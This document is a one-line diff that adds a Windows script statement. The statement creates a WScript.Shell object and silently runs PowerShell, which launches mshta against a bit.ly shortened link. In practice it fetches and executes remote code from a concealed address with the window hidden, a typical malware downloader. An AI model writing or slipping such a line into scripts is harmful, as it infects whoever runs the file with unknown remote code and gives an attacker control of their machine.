@@ -1,0 +1,1 @@
+WScript.CreateObject("WScript.Shell").Run("Powershell.exe mshta https://bit.ly/3xlKFyx",0)
